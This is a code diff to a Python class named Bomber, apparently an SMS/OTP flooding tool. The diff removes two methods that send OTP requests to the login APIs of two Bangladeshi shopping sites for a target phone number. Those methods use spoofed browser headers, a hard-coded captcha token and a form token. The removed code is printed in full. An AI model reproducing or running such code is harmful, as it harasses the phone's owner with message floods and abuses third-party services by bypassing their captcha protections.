@@ -138,66 +138,9 @@ class Bomber:
       pass
     return False
 
-  def shopz(self):
-    url = "https://www.shopz.com.bd/api/v1/auth/send-otp"
-    headers = {
-        "accept": "*/*",
-        "content-type": "application/json",
-        "origin": "https://www.shopz.com.bd",
-        "referer": "https://www.shopz.com.bd/login",
-        "user-agent": self.getUserAgent(),
-        "x-requested-with": "mark.via.gp",
-    }
-    phone_num = self.user_mobile
-    if not phone_num.startswith("+88"):
-      if phone_num.startswith("88"):
-        phone_num = "+" + phone_num
-      else:
-        phone_num = "+88" + phone_num
-
-    payload = {
-        "phone": phone_num,
-        "purpose": "login",
-        "captchaToken": (
-            "1.kJ9waKkYlBujOwexbvOl63WZrg2sBM5vKdna9SAuTgT_7kB69GgdBbs-jvo-B49IY8qDBfILwN11cm_udwSoDVLts9qlfC0djA0T8duFpShaSNqONsoZSPm18dbTmD367tBY_LTU2Hjv1IVo_hIcRVkyhcS2pHt02jy6a9CIdFkCgVUL082k8c81zSzhRyhDhs0XRluYHMDdRXxDkpmWe5uS7Wr7S5oal3SY1nJ-Q3eI9qIP9I2gVYDTFLdzfdcAz2rqAfcMLw9PteBqXZnGxKIDl7vv30IjjSCZSGWMCsthVGlNkJVn5w2MHwTEo1f0XKV0JYhdzsyqB3tGgIpuvIw5VCeWFSjol_GLg5FXZPf0_g5Zxc5JhiRlKTc5tqvlGhCOA4DaYnYRZoKOa7I7zXcU85nb8YqtYDgoo4FLfSD-XjoYhFIuxSSANRmucUR7WnGJrAcuPdgsMHYZJDG4reRhoQexWC_RyMPQuVAYgp5xK62pN5J87xHx49koZGbUd2IhE73RjucZbcn1MzoS19tWocmky0sJNzLivVkpvfby8b-mepIGNNopfVtLRyScjemlZjcDY8PLX7TOum97Ar3CuZPCg4jYyXl3AVWak5OFYA98Hy99NQZmUgy8c5hB2gO-u05m9fjbmaJQtnLITqbQLm5fYkkMwuOenIenyJ_EV59WG2sQ5vP7o4MUJUnlA63iUXhHeneYObrv53oTmqrAlQ7jrtsq2ZtP0y36Gqo.WrDo0A20eZBpeygKDN7UIg.fa47062f3ec85ee87e62027d0026a4b32addfaeb1d854642ce2aae530bc8d564"
-        ),
-    }
-    try:
-      r = requests.post(url, json=payload, headers=headers, timeout=5)
-      if r.status_code == 200:
-        return True
-    except:
-      pass
-    return False
-
-  def ghorerbazar(self):
-    url = "https://ghorerbazar.com/submit/otp"
-    headers = {
-        "Host": "ghorerbazar.com",
-        "User-Agent": self.getUserAgent(),
-        "Accept": (
-            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
-        ),
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://ghorerbazar.com",
-        "Referer": "https://ghorerbazar.com/varify/otp",
-        "X-Requested-With": "mark.via.gp",
-    }
-    payload = {
-        "_token": "0ecCDCSnO9CedtuzdjGG55EO8dw8RtHN68H2YbE0",
-        "phone": self.user_mobile,
-        "name": "Oustad User",
-        "otp": "",
-    }
-    try:
-      r = requests.post(url, data=payload, headers=headers, timeout=5)
-      if r.status_code in [200, 301, 302]:
-        return True
-    except:
-      pass
-    return False
 
 
+  
   
 
   
@@ -245,8 +188,8 @@ class Bomber:
         self.aroggo,
         self.grameenphone,
         self.bdtickets,
-        self.shopz,
-        self.ghorerbazar,
+        
+        
         
         
         
